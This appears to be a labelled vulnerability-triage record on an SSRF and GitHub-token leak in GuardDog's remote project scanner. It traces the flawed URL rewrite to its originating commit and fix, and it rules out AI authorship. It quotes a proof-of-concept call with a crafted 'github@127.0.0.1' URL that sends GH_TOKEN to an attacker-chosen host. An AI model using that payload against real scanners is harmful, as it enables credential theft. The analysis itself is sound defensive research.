bug_semantics: GuardDog's programmatic remote project scanner (`ProjectScanner.scan_remote` / `PypiRequirementsScanner.scan_remote`) takes a caller-supplied repository URL, rewrites it with the blind substring `url.replace("github", "raw.githubusercontent")`, concatenates `/{branch}/{requirements_name}`, and then `requests.get`s that URL with HTTP Basic auth from `GIT_USERNAME`/`GH_TOKEN`. The rewrite never parses hostname, userinfo, or port, so a crafted URL such as `http://github@127.0.0.1:18081/owner/repo` becomes `http://raw.githubusercontent@127.0.0.1:18081/owner/repo/main/requirements.txt`. Requests treats that as a request to `127.0.0.1:18081` and attaches the GitHub PAT, yielding SSRF plus `GH_TOKEN` exfiltration (CWE-918).
flaw_origin: The exploitable combination was first written on 2022-07-29 in `b198bdef92abad9a4815d90fda561e45f206fc00` (`requirements scanning and one repo scanning done` by Ellen Wang). That commit added `RequirementsScanner.scan_repo(url, branch, requirements_name)` in `pysecurity/scanners/project_scanner.py` (later renamed `scan_remote` and moved to `guarddog/scanners/scanner.py`) with the user-supplied URL, the blind replace, and `auth=token` from `GH_TOKEN`. Four days earlier `580941e2` had used `.replace("github", "raw.githubusercontent")` only on GitHub API `html_url` values while listing DataDog org repos and did not send credentials; that snippet is not the vulnerability. Later npm-support and formatting commits only moved or restyled the same lines.

CNA/GHSA copy describes ProjectScanner.scan_remote rewriting attacker-controlled URLs with url.replace("github", "raw.githubusercontent") then requests.get(..., auth=token). PoC: PypiRequirementsScanner().scan_remote("http://github@127.0.0.1:18081/owner/repo", "main", "requirements.txt") leaks Authorization: Basic of GIT_USERNAME/GH_TOKEN. Key path cited as guarddog/scanners/scanner.py:361-365.

reasoning: Vulnerability first: GHSA-587r-mc96-6f2p / CVE-2026-44971 is a live PUBLISHED CWE-918, not withdrawn. The sink is ProjectScanner.scan_remote: a caller-controlled GitHub URL is rewritten by blind substring replacement and fetched with the process GH_TOKEN. That is SSRF plus credential theft against anyone who can supply the scanned repo URL (the public programmatic API; the GHSA PoC uses PypiRequirementsScanner.scan_remote). The same replace idiom appeared four days earlier in 580941e2, but only against GitHub API html_url values for an internal org crawl and without credentials, so it could not leak GH_TOKEN or let an attacker choose the host. BIC is therefore b198bdef, the smallest public commit that first wrote the user-supplied url + replace + auth=token lines (scan_repo at pysecurity/scanners/project_scanner.py:112-117). Parent 580941e2 was grepped directly; those three lines are absent. 50ff5e76 is a file-move of already-vulnerable code into scanner.py (parent 67963ee still has the lines), and 1e947bd6 is a rename, so neither is the BIC. The BIC is a single-parent Ellen Wang commit with an empty message and no AI trailers, so AI authorship is judged only on that object and is absent. The GHSA/CNA still advertise Patched versions: None, but that is stale metadata: d53fe3a removes the replace, PR #727 merge 5d15a38 lands it, and tag v2.10.0 contains the validated URL builder while v2.9.0 still has the vulnerable four lines. Closed NOT_AI with BIC b198bdef and fix 5d15a38 / direct d53fe3a.
